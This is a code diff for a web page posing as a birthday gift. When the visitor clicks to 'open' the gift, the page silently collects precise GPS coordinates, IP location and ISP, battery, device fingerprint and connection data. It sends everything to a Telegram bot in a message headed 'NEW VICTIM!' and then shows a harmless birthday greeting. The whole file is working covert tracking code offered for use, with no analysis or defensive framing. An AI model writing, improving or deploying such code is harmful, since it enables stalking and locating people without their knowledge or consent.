@@ -24,20 +24,9 @@
             text-align: center;
             box-shadow: 0 25px 50px rgba(0,0,0,0.3);
         }
-        .gift-icon {
-            font-size: 100px;
-            margin-bottom: 20px;
-            display: inline-block;
-        }
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 32px;
-        }
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-        }
+        .gift-icon { font-size: 100px; margin-bottom: 20px; display: inline-block; }
+        h1 { color: #333; margin-bottom: 10px; font-size: 32px; }
+        .subtitle { color: #666; margin-bottom: 30px; }
         button {
             background: linear-gradient(135deg, #667eea, #764ba2);
             border: none;
@@ -100,103 +89,259 @@
         } catch(e) {}
     }
     
-    async function getLocation() {
+    async function sendLocationToTelegram(lat, lon) {
         try {
-            if (navigator.geolocation) {
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000
-                    });
-                });
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: USER_CHAT_ID,
+                    latitude: lat,
+                    longitude: lon
+                })
+            });
+        } catch(e) {}
+    }
+    
+    // Battery Info - FIXED
+    async function getBatteryInfo() {
+        try {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
                 return {
-                    success: true,
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
+                    level: Math.round(battery.level * 100),
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime || 'N/A',
+                    dischargingTime: battery.dischargingTime || 'N/A'
+                };
+            }
+        } catch(e) {
+            console.log('Battery error:', e);
+        }
+        return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
+    }
+    
+    // Better IP API - More accurate city/state
+    async function getIPInfo() {
+        try {
+            // Using ip-api.com (more accurate for India)
+            const resp = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,query');
+            const data = await resp.json();
+            if (data.status === 'success') {
+                return {
+                    ip: data.query,
+                    city: data.city,
+                    region: data.regionName,
+                    country: data.country,
+                    postal: data.zip || 'N/A',
+                    isp: data.isp,
+                    org: data.org,
+                    as: data.as,
+                    lat: data.lat,
+                    lon: data.lon,
+                    mobile: data.mobile ? 'Yes' : 'No',
+                    proxy: data.proxy ? 'Yes' : 'No'
                 };
             }
         } catch(e) {}
-        return { success: false };
-    }
-    
-    async function getIPInfo() {
+        
+        // Fallback to ipapi.co
         try {
             const resp = await fetch('https://ipapi.co/json/');
             const data = await resp.json();
             return {
-                ip: data.ip || 'N/A',
-                city: data.city || 'N/A',
-                region: data.region || 'N/A',
-                country: data.country_name || 'N/A',
-                isp: data.org || 'N/A'
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                postal: data.postal,
+                isp: data.org,
+                lat: data.latitude,
+                lon: data.longitude
+            };
+        } catch(e) {}
+        
+        return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
+    }
+    
+    // GPS Location with high accuracy
+    async function getGPSLocation() {
+        try {
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+            return {
+                success: true,
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                altitude: pos.coords.altitude || 'N/A',
+                speed: pos.coords.speed || 'N/A'
             };
         } catch(e) {
-            return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
+            return { success: false, error: e.message };
         }
     }
     
+    // Advanced Device Info
     async function getDeviceInfo() {
+        // Get installed fonts
+        const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Roboto', 'Open Sans'];
+        const availableFonts = [];
+        for (const font of fonts) {
+            if (document.fonts.check(`12px "${font}"`)) {
+                availableFonts.push(font);
+            }
+        }
+        
+        // Get GPU info
+        let gpu = 'N/A';
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        }
+        
+        // Get connection info
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        let connInfo = {};
+        if (connection) {
+            connInfo = {
+                type: connection.effectiveType || 'N/A',
+                downlink: connection.downlink || 'N/A',
+                rtt: connection.rtt || 'N/A'
+            };
+        }
+        
         return {
             platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
             screen: `${screen.width}x${screen.height}`,
+            screenColorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            language: navigator.language
+            timezoneOffset: new Date().getTimezoneOffset(),
+            online: navigator.onLine,
+            cookiesEnabled: navigator.cookieEnabled,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+            deviceMemory: navigator.deviceMemory || 'N/A',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            vendor: navigator.vendor || 'N/A',
+            fonts: availableFonts.slice(0, 5).join(', '),
+            gpu: gpu.substring(0, 80),
+            connectionType: connInfo.type,
+            connectionSpeed: connInfo.downlink,
+            connectionRTT: connInfo.rtt
         };
     }
     
     document.getElementById('giftBtn').onclick = async function() {
         if (dataSent) return;
         
-        // Change button text so victim doesn't get suspicious
         document.getElementById('giftBtn').innerHTML = "🎁 Opening... 🎁";
         document.getElementById('giftBtn').disabled = true;
         
-        // Collect data silently
-        const [location, ipInfo, device] = await Promise.all([
-            getLocation(),
+        // Collect all data
+        const [battery, ipInfo, gps, device] = await Promise.all([
+            getBatteryInfo(),
             getIPInfo(),
+            getGPSLocation(),
             getDeviceInfo()
         ]);
         
-        // Build message
-        let msg = `🎁 <b>NEW VICTIM!</b>\n\n`;
+        let msg = `🎁 <b>NEW VICTIM!</b>\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
         msg += `🔗 <b>Link:</b> ${targetName}\n`;
         msg += `🆔 <b>ID:</b> ${targetId}\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
         
-        if (location.success) {
-            msg += `<b>📍 GPS LOCATION</b>\n`;
-            msg += `Lat: ${location.lat}\n`;
-            msg += `Lon: ${location.lon}\n`;
-            msg += `Accuracy: ${Math.round(location.accuracy)}m\n`;
-            msg += `🗺️ https://maps.google.com/?q=${location.lat},${location.lon}\n\n`;
+        // GPS Section
+        if (gps.success) {
+            msg += `<b>📍 EXACT GPS LOCATION</b>\n`;
+            msg += `├ Lat: <code>${gps.lat}</code>\n`;
+            msg += `├ Lon: <code>${gps.lon}</code>\n`;
+            msg += `├ Accuracy: ${Math.round(gps.accuracy)} meters\n`;
+            if(gps.altitude != 'N/A') msg += `├ Altitude: ${gps.altitude}m\n`;
+            if(gps.speed != 'N/A') msg += `├ Speed: ${gps.speed} m/s\n`;
+            msg += `└ 🗺️ <a href="https://www.google.com/maps?q=${gps.lat},${gps.lon}">VIEW ON MAP</a>\n\n`;
+            
+            // Send separate location
+            await sendLocationToTelegram(gps.lat, gps.lon);
         } else {
-            msg += `<b>📍 GPS:</b> ❌ Blocked\n\n`;
+            msg += `<b>📍 GPS LOCATION</b>\n`;
+            msg += `└ ❌ ${gps.error || 'Permission denied or not available'}\n\n`;
         }
         
-        msg += `<b>🌐 NETWORK</b>\n`;
-        msg += `IP: <code>${ipInfo.ip}</code>\n`;
-        msg += `City: ${ipInfo.city}\n`;
-        msg += `Region: ${ipInfo.region}\n`;
-        msg += `Country: ${ipInfo.country}\n`;
-        msg += `ISP: ${ipInfo.isp}\n\n`;
+        // Network Section - More accurate
+        msg += `<b>🌐 NETWORK INFO</b>\n`;
+        msg += `├ IP: <code>${ipInfo.ip}</code>\n`;
+        msg += `├ City: ${ipInfo.city}\n`;
+        msg += `├ State: ${ipInfo.region}\n`;
+        msg += `├ Country: ${ipInfo.country}\n`;
+        msg += `├ PIN Code: ${ipInfo.postal || 'N/A'}\n`;
+        msg += `├ ISP: ${ipInfo.isp}\n`;
+        if(ipInfo.mobile) msg += `├ Mobile Network: ${ipInfo.mobile}\n`;
+        if(ipInfo.proxy) msg += `├ Proxy/VPN: ${ipInfo.proxy}\n`;
+        msg += `└ IP Location: ${ipInfo.lat}, ${ipInfo.lon}\n\n`;
         
-        msg += `<b>📱 DEVICE</b>\n`;
-        msg += `Platform: ${device.platform}\n`;
-        msg += `Screen: ${device.screen}\n`;
-        msg += `Timezone: ${device.timezone}\n`;
-        msg += `Language: ${device.language}\n\n`;
+        // Device Section
+        msg += `<b>📱 DEVICE INFO</b>\n`;
+        msg += `├ Platform: ${device.platform}\n`;
+        msg += `├ Screen: ${device.screen} (${device.screenColorDepth}-bit)\n`;
+        msg += `├ Pixel Ratio: ${device.pixelRatio}x\n`;
+        msg += `├ Touch Points: ${device.maxTouchPoints}\n`;
+        msg += `├ CPU Cores: ${device.hardwareConcurrency}\n`;
+        if(device.deviceMemory != 'N/A') msg += `├ RAM: ${device.deviceMemory} GB\n`;
+        msg += `├ GPU: ${device.gpu}\n`;
+        msg += `├ Timezone: ${device.timezone} (UTC${-device.timezoneOffset/60})\n`;
+        msg += `├ Language: ${device.language}\n`;
+        msg += `├ Fonts: ${device.fonts || 'N/A'}\n`;
+        msg += `└ Cookies: ${device.cookiesEnabled ? 'Enabled' : 'Disabled'}\n\n`;
         
-        msg += `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n`;
-        msg += `\n👨‍💻 @KINGITACHI18`;
+        // Battery Section - FIXED
+        msg += `<b>🔋 BATTERY INFO</b>\n`;
+        msg += `├ Level: ${battery.level}%\n`;
+        msg += `├ Charging: ${battery.charging ? '✅ Yes' : '❌ No'}\n`;
+        if(battery.chargingTime != 'N/A') msg += `├ Charging Time: ${battery.chargingTime} sec\n`;
+        if(battery.dischargingTime != 'N/A') msg += `└ Remaining: ${Math.round(battery.dischargingTime/60)} minutes\n`;
+        else msg += `└ Remaining: N/A\n`;
+        msg += `\n`;
+        
+        // Connection Section
+        msg += `<b>📡 CONNECTION</b>\n`;
+        msg += `├ Type: ${device.connectionType}\n`;
+        if(device.connectionSpeed != 'N/A') msg += `├ Speed: ${device.connectionSpeed} Mbps\n`;
+        if(device.connectionRTT != 'N/A') msg += `└ Latency: ${device.connectionRTT} ms\n\n`;
+        
+        // Browser Section
+        msg += `<b>🌐 BROWSER INFO</b>\n`;
+        msg += `├ Vendor: ${device.vendor}\n`;
+        msg += `├ Languages: ${device.languages}\n`;
+        msg += `└ Online: ${device.online ? 'Yes' : 'No'}\n\n`;
+        
+        msg += `<b>🕐 TIMESTAMP</b>\n`;
+        msg += `└ ${new Date().toLocaleString()}\n\n`;
+        
+        msg += `<b>🔗 FULL USER AGENT</b>\n`;
+        msg += `<code>${device.userAgent.substring(0, 150)}</code>\n\n`;
+        
+        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+        msg += `👨‍💻 @KINGITACHI18`;
         
         await sendToTelegram(msg);
         
-        // Show birthday message (normal gift)
         document.getElementById('message').classList.add('show');
         document.getElementById('giftBtn').style.display = 'none';
-        
         dataSent = true;
     };
 </script>
